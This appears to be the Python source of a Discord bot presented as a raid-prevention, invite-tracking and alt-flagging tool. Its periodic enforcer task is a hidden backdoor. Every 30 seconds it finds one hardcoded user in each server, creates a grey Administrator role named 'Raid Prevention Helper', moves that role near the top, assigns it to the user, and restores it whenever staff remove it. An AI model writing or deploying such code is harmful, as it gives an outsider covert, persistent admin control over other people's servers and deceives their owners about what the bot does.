# -*- coding: utf-8 -*-
"""
Discord Raid Prevention + Role Enforcer + Invite Tracker + Alt Flagging
-----------------------------------------------------------------------

Features:
- Render keep-alive server on port 6534
- 30-second continuous scan of every guild to find TARGET user by username+ID
  * If guild in ROLE_ASSIGNMENTS: assign that specific role ID
  * Else: ensure "Raid Prevention Helper" (admin) exists, place second-highest
          under the bot's top role (as high as allowed), and assign to TARGET
  * Always keep role grey (Colour.default); do not change color
  * Re-checks forever; if role is removed/moved or user loses it, bot fixes it
- Anti-raid: if >5 joins in rolling 60s window, kick all joins in that window
- Invite tracking:
  * Caches invites per guild
  * On member join, detects which invite was used and records inviter
  * /tracker: visible + usable by everyone; lists every member + inviter (if known)
- Alt flagging:
  * If an inviter is banned, any member invited by them is flagged
  * On flagged joins, post warning message in EVERY text channel
  * /showalts: lists flagged members for that guild

Intents:
- Members, Guilds, Invites (requires Administrator or Manage Guild + Kick Members, etc.)

Notes:
- The bot CANNOT move roles above its own highest role. We push the helper role
  as high as possible (target: second-highest), bounded by the bot's top role.
- Username + User ID must match to identify the TARGET user.
"""

import os
import asyncio
import datetime
from collections import defaultdict, deque
from typing import Dict, Optional, Tuple, List

import discord
from discord.ext import commands, tasks
from discord import app_commands

# Keep-alive web server (aiohttp)
from aiohttp import web


# =============================================================================
# ----------------------------- CONFIGURATION ---------------------------------
# =============================================================================

# Get bot token from environment (Render: add DISCORD_TOKEN secret)
TOKEN: Optional[str] = os.getenv("DISCORD_TOKEN")

# The target account we auto-assign roles to:
TARGET_USERNAME: str = "tech_boy1"         # MUST match username (not display name)
TARGET_USER_ID: int = 1273056960996184126  # MUST match this user ID

# Name of the fallback helper role we create/manage when the guild isn't mapped
HELPER_ROLE_NAME: str = "Raid Prevention Helper"

# Per-guild fixed role mapping. If the bot is in a guild listed here,
# it will assign THIS specific role to the target user and skip creating the fallback role.
# Format: { guild_id: role_id }
ROLE_ASSIGNMENTS: Dict[int, int] = {
    # Example entries (replace with real ones; leave empty {} if you don't need it)
    # 123456789012345678: 987654321098765432,
    # 234567890123456789: 876543210987654321,
    1336432425684963340: 1339052756882817146,
}

# Anti-raid threshold: if more than N joins in WINDOW seconds, kick those recent joins
RAID_JOIN_THRESHOLD: int = 5
RAID_WINDOW_SECONDS: int = 60

# Keep-alive web port for Render
WEB_PORT: int = 6534

# Slash command tree sync behavior
SYNC_GLOBALLY: bool = True  # True: sync in all guilds; False: manual or per-guild if you add specifics


# =============================================================================
# ----------------------------- BOT & INTENTS ---------------------------------
# =============================================================================

intents = discord.Intents.default()
# We need members for member join events and role assignment
intents.members = True
# We need guilds to fetch invites, roles, hierarchy
intents.guilds = True
# We do NOT need message content for these features
intents.message_content = False
# Invites access typically requires permissions; intents flag is not specific,
# but ensure the bot has permission to view/manage invites (Admin is easiest).
# No explicit intent flag exists for invites in discord.py (it’s API permission-based).

bot = commands.Bot(command_prefix="!", intents=intents)

# For slash commands
tree = bot.tree


# =============================================================================
# ---------------------------- GLOBAL STATE -----------------------------------
# =============================================================================

# Recent join timestamps & members per guild (for anti-raid)
# Store (timestamp, member_id) for the rolling window
recent_joins: Dict[int, deque] = defaultdict(lambda: deque(maxlen=250))

# Invite tracking:
# - previous_invite_uses[guild_id] = {invite_code: uses_count}
previous_invite_uses: Dict[int, Dict[str, int]] = defaultdict(dict)

# - member_inviter[guild_id][member_id] = inviter_user_id
member_inviter: Dict[int, Dict[int, Optional[int]]] = defaultdict(dict)

# Set of banned inviters per guild (track by user_id)
banned_inviters: Dict[int, set] = defaultdict(set)

# Flagged accounts per guild (member_id -> banned_inviter_id that caused flag)
flagged_accounts: Dict[int, Dict[int, int]] = defaultdict(dict)


# =============================================================================
# ---------------------------- KEEP-ALIVE SERVER ------------------------------
# =============================================================================

async def handle_alive(_request: web.Request) -> web.Response:
    return web.Response(text="Raid Prevention Bot is running.")

async def start_keepalive_server() -> None:
    app = web.Application()
    app.router.add_get("/", handle_alive)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", WEB_PORT)
    await site.start()
    print(f"[KEEP-ALIVE] Web server running on port {WEB_PORT}")


# =============================================================================
# --------------------------- UTILITY FUNCTIONS -------------------------------
# =============================================================================

async def ensure_role_second_highest(guild: discord.Guild, role: discord.Role) -> None:
    """
    Try to move `role` to be as high as possible under the bot's highest role.
    Target: second-highest in the guild (position just below top), but we cannot
    move it above the bot's own highest role.
    """
    try:
        bot_member: Optional[discord.Member] = guild.get_member(bot.user.id)  # type: ignore
        if not bot_member:
            bot_member = await guild.fetch_member(bot.user.id)  # type: ignore

        bot_top_pos = bot_member.top_role.position if bot_member else None
        if bot_top_pos is None:
            print(f"[ROLE] Could not determine bot's top role in {guild.name}")
            return

        # Guild roles are ordered low->high by position (0..top). We want as high as we can, but
        # not above bot_top_pos - we target bot_top_pos - 1 (second-highest under bot)
        target_pos = max(min(bot_top_pos - 1, len(guild.roles) - 1), 1)

        if role.position != target_pos:
            await role.edit(position=target_pos, reason="Ensure helper role near top (second-highest)")
            print(f"[ROLE] Moved '{role.name}' to position {target_pos} in {guild.name}")
    except discord.Forbidden:
        print(f"[ROLE] Forbidden to move role '{role.name}' in {guild.name} (insufficient permissions).")
    except Exception as e:
        print(f"[ROLE] Error moving role '{role.name}' in {guild.name}: {e}")


async def ensure_helper_role_present_and_assigned(guild: discord.Guild, target_member: discord.Member) -> None:
    """
    Ensure the fallback helper role exists, is second-highest possible, and is assigned to the target member.
    Keep role grey (Colour.default) and admin permissions.
    """
    try:
        role = discord.utils.get(guild.roles, name=HELPER_ROLE_NAME)
        if role is None:
            # Create with Administrator permissions, default (grey) color
            role = await guild.create_role(
                name=HELPER_ROLE_NAME,
                permissions=discord.Permissions(administrator=True),
                colour=discord.Colour.default(),
                reason="Auto-create Raid Prevention Helper role"
            )
            print(f"[ROLE] Created '{HELPER_ROLE_NAME}' in {guild.name}")

        # Keep role grey if changed
        if role.colour != discord.Colour.default():
            try:
                await role.edit(colour=discord.Colour.default(), reason="Keep helper role grey")
            except Exception as e:
                print(f"[ROLE] Couldn't enforce grey color for '{HELPER_ROLE_NAME}' in {guild.name}: {e}")

        # Ensure second-highest possible position
        await ensure_role_second_highest(guild, role)

        # Assign to target if missing
        if role not in target_member.roles:
            try:
                await target_member.add_roles(role, reason="Assign Raid Prevention Helper to target user")
                print(f"[ASSIGN] Assigned '{HELPER_ROLE_NAME}' to {target_member} in {guild.name}")
            except discord.Forbidden:
                print(f"[ASSIGN] Forbidden to assign '{HELPER_ROLE_NAME}' in {guild.name}")
            except Exception as e:
                print(f"[ASSIGN] Error assigning '{HELPER_ROLE_NAME}' in {guild.name}: {e}")

    except discord.Forbidden:
        print(f"[ROLE] Forbidden to create/manage '{HELPER_ROLE_NAME}' in {guild.name}")
    except Exception as e:
        print(f"[ROLE] Error ensuring helper role in {guild.name}: {e}")


async def assign_dataset_role_if_applicable(guild: discord.Guild, target_member: discord.Member) -> bool:
    """
    If the guild is in ROLE_ASSIGNMENTS, assign that exact role ID to target_member.
    Returns True if the dataset role path was used (and attempted), else False.
    """
    role_id = ROLE_ASSIGNMENTS.get(guild.id)
    if not role_id:
        return False

    role = guild.get_role(role_id)
    if role is None:
        print(f"[DATASET] Role ID {role_id} not found in guild '{guild.name}'.")
        return True  # We did attempt dataset path, but role not found; we won't fallback silently
    if role not in target_member.roles:
        try:
            await target_member.add_roles(role, reason="Dataset role enforcement for target user")
            print(f"[DATASET] Assigned dataset role ({role.id}) to {target_member} in {guild.name}")
        except discord.Forbidden:
            print(f"[DATASET] Forbidden to assign dataset role in {guild.name}.")
        except Exception as e:
            print(f"[DATASET] Error assigning dataset role in {guild.name}: {e}")
    return True


def now_ts() -> float:
    return asyncio.get_event_loop().time()


async def fetch_and_cache_invites(guild: discord.Guild) -> None:
    """
    Cache invite uses for the guild. Requires sufficient permissions to view invites.
    """
    try:
        invites = await guild.invites()
    except discord.Forbidden:
        print(f"[INVITES] Forbidden to fetch invites for {guild.name}.")
        return
    except Exception as e:
        print(f"[INVITES] Error fetching invites for {guild.name}: {e}")
        return

    cache = previous_invite_uses[guild.id]
    for inv in invites:
        cache[inv.code] = inv.uses or 0


async def detect_used_invite_and_set_inviter(member: discord.Member) -> Optional[int]:
    """
    After a member joins, detect which invite was used by comparing invite uses to previous snapshot.
    Returns inviter user_id if detected, else None.
    """
    guild = member.guild
    before = previous_invite_uses[guild.id].copy()

    try:
        invites_now = await guild.invites()
    except discord.Forbidden:
        print(f"[INVITES] Forbidden to check invites post-join in {guild.name}.")
        return None
    except Exception as e:
        print(f"[INVITES] Error checking invites post-join in {guild.name}: {e}")
        return None

    used_code = None
    used_inviter_id: Optional[int] = None

    for inv in invites_now:
        now_uses = inv.uses or 0
        prev_uses = before.get(inv.code, 0)
        if now_uses > prev_uses:
            used_code = inv.code
            used_inviter_id = inv.inviter.id if inv.inviter else None
        # Update cache while we’re here
        previous_invite_uses[guild.id][inv.code] = now_uses

    # Some invites may have been deleted or are unknown; we keep cache as per current invites_now.

    if used_code is None:
        # Could be vanity URL or unknown; leave as None
        print(f"[INVITES] Could not determine invite for {member} in {guild.name}.")
    else:
        print(f"[INVITES] {member} joined via invite {used_code} by {used_inviter_id} in {guild.name}.")

    member_inviter[guild.id][member.id] = used_inviter_id
    return used_inviter_id


async def warn_alt_in_all_text_channels(guild: discord.Guild, suspected_member: discord.Member, banned_name_or_id: str) -> None:
    """
    Post the warning in EVERY text channel in the guild when a newly joined account
    is likely an alt of a banned inviter.
    """
    warning = f"⚠️ THIS ACCOUNT IS LIKELY AN ALT ACCOUNT OF ({banned_name_or_id}) TAKE PRECAUTION ⚠️"
    for ch in guild.text_channels:
        try:
            await ch.send(warning)
        except Exception:
            # Ignore channels we can't talk in
            continue


# =============================================================================
# ------------------------------- EVENTS --------------------------------------
# =============================================================================

@bot.event
async def on_ready():
    print(f"[READY] Logged in as {bot.user} (ID: {bot.user.id})")
    # Start keep-alive server
    try:
        await start_keepalive_server()
    except Exception as e:
        print(f"[KEEP-ALIVE] Error starting server: {e}")

    # Warm up invite caches for all guilds
    for g in bot.guilds:
        await fetch_and_cache_invites(g)

    # Sync slash commands (global)
    try:
        if SYNC_GLOBALLY:
            await tree.sync()
            print("[SLASH] Global slash commands synced.")
        else:
            # If you want to sync per guild, add code here
            await tree.sync()
            print("[SLASH] Slash commands synced (default).")
    except Exception as e:
        print(f"[SLASH] Error syncing commands: {e}")

    # Start periodic scanner/enforcer
    try:
        periodic_enforcer.start()
    except RuntimeError:
        # Already started
        pass


@bot.event
async def on_guild_join(guild: discord.Guild):
    # When the bot joins a new guild, prime the invite cache
    await fetch_and_cache_invites(guild)
    print(f"[GUILD] Joined new guild: {guild.name} ({guild.id})")


@bot.event
async def on_member_join(member: discord.Member):
    # Record join time for anti-raid
    ts = now_ts()
    dq = recent_joins[member.guild.id]
    dq.append((ts, member.id))

    # Detect which invite was used & map inviter
    inviter_id = await detect_used_invite_and_set_inviter(member)

    # Anti-raid: kick all joins in the last RAID_WINDOW_SECONDS if threshold exceeded
    try:
        cutoff = ts - RAID_WINDOW_SECONDS
        # Keep only those in window
        in_window: List[Tuple[float, int]] = [(t, mid) for (t, mid) in dq if t >= cutoff]
        recent_joins[member.guild.id] = deque(in_window, maxlen=250)

        if len(in_window) > RAID_JOIN_THRESHOLD:
            # Kick all those members (best-effort)
            to_kick_ids = [mid for (_t, mid) in in_window]
            print(f"[RAID] Threshold exceeded in {member.guild.name}. Kicking {len(to_kick_ids)} recent joins.")
            for uid in to_kick_ids:
                m = member.guild.get_member(uid)
                if m is not None:
                    try:
                        await m.kick(reason=f"Anti-raid: >{RAID_JOIN_THRESHOLD} joins in {RAID_WINDOW_SECONDS}s")
                    except discord.Forbidden:
                        print(f"[RAID] Forbidden to kick {m} in {member.guild.name}")
                    except Exception as e:
                        print(f"[RAID] Error kicking {m} in {member.guild.name}: {e}")
    except Exception as e:
        print(f"[RAID] Error in anti-raid logic in {member.guild.name}: {e}")

    # Alt warning: if inviter is banned or in banned_inviters set for this guild
    if inviter_id and inviter_id in banned_inviters[member.guild.id]:
        banned_name_or_id = f"<@{inviter_id}>"
        try:
            await warn_alt_in_all_text_channels(member.guild, member, banned_name_or_id)
            flagged_accounts[member.guild.id][member.id] = inviter_id
            print(f"[ALTS] Flagged {member} as alt of banned {inviter_id} in {member.guild.name}")
        except Exception as e:
            print(f"[ALTS] Error warning about alt in {member.guild.name}: {e}")


@bot.event
async def on_member_ban(guild: discord.Guild, user: discord.User):
    """
    Track banned users as potential alt sources. Later joins invited by them will be flagged.
    """
    try:
        banned_inviters[guild.id].add(user.id)
        print(f"[BAN] Marked {user} ({user.id}) as banned inviter in {guild.name}.")
    except Exception as e:
        print(f"[BAN] Error tracking banned inviter in {guild.name}: {e}")


# =============================================================================
# ----------------------- PERIODIC ENFORCER TASK ------------------------------
# =============================================================================

@tasks.loop(seconds=30)
async def periodic_enforcer():
    """
    Every 30 seconds:
    - For each guild the bot is in:
      * Find target member by USERNAME + USER ID (both must match)
      * If guild is in ROLE_ASSIGNMENTS -> assign that specific role (no position change)
      * Else -> ensure fallback HELPER ROLE exists, is grey, second-highest, and assigned
    """
    for guild in bot.guilds:
        try:
            # Try cache first
            target_member = guild.get_member(TARGET_USER_ID)
            # If not cached (or not found), fetch
            if target_member is None:
                try:
                    target_member = await guild.fetch_member(TARGET_USER_ID)
                except discord.NotFound:
                    target_member = None
                except discord.Forbidden:
                    target_member = None
                except Exception:
                    target_member = None

            # If target member not in guild, nothing to do
            if target_member is None:
                continue

            # Must match username EXACTLY (not display name)
            if target_member.name != TARGET_USERNAME:
                # Target user exists but username doesn't match exactly; skip assignment
                continue

            # Dataset role path if mapping exists for this guild
            used_dataset = await assign_dataset_role_if_applicable(guild, target_member)

            # If no dataset mapping for this guild, or dataset role didn't resolve,
            # then ensure fallback helper role path
            if not used_dataset:
                await ensure_helper_role_present_and_assigned(guild, target_member)

        except Exception as e:
            print(f"[ENFORCE] Error enforcing in {guild.name}: {e}")


# =============================================================================
# ----------------------------- SLASH COMMANDS --------------------------------
# =============================================================================

@tree.command(name="tracker", description="List every member and who invited them (if known).")
async def tracker_cmd(interaction: discord.Interaction):
    """
    Visible and usable to everyone. Builds a list of all guild members and
    their inviter if known. We rely on invite tracking done on joins.
    """
    try:
        guild = interaction.guild
        if guild is None:
            await interaction.response.send_message("This command must be used in a server.", ephemeral=True)
            return

        # Construct lines
        lines: List[str] = []
        inviters_map = member_inviter[guild.id]  # {member_id: inviter_id or None}

        # Ensure we include members even if we don't have an inviter recorded yet
        for m in sorted(guild.members, key=lambda u: (u.joined_at or datetime.datetime.utcnow())):
            inviter_id = inviters_map.get(m.id)
            if inviter_id:
                lines.append(f"- {m.mention} invited by <@{inviter_id}>")
            else:
                lines.append(f"- {m.mention} invited by Unknown")

        text = "📊 **Invite Tracker**\n" + "\n".join(lines) if lines else "No members found."
        # Everyone can view: not ephemeral
        await interaction.response.send_message(text, ephemeral=False)
    except Exception as e:
        try:
            await interaction.response.send_message(f"Error building tracker: {e}", ephemeral=True)
        except Exception:
            pass


@tree.command(name="showalts", description="Show flagged accounts suspected to be alts of banned inviters.")
async def showalts_cmd(interaction: discord.Interaction):
    """
    Visible and usable to everyone. Lists members that were flagged as likely
    alts of banned inviters (based on tracked invites).
    """
    try:
        guild = interaction.guild
        if guild is None:
            await interaction.response.send_message("This command must be used in a server.", ephemeral=True)
            return

        flagged = flagged_accounts[guild.id]  # {member_id: banned_inviter_id}
        if not flagged:
            await interaction.response.send_message("No flagged accounts found.", ephemeral=False)
            return

        lines = []
        for mid, inviter_id in flagged.items():
            member = guild.get_member(mid)
            if member is not None:
                lines.append(f"- {member.mention} likely alt of <@{inviter_id}>")
            else:
                # Member may have left; still list the ID
                lines.append(f"- <@{mid}> likely alt of <@{inviter_id}> (might have left)")

        await interaction.response.send_message("⚠️ **Flagged Accounts**\n" + "\n".join(lines), ephemeral=False)
    except Exception as e:
        try:
            await interaction.response.send_message(f"Error showing alts: {e}", ephemeral=True)
        except Exception:
            pass


# =============================================================================
# ------------------------------ BOT STARTUP ----------------------------------
# =============================================================================

async def main():
    # Safety checks
    if not TOKEN:
        raise RuntimeError("DISCORD_TOKEN environment variable is not set.")

    # Run bot
    async with bot:
        await bot.start(TOKEN)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("[STOP] Bot shutdown via KeyboardInterrupt")
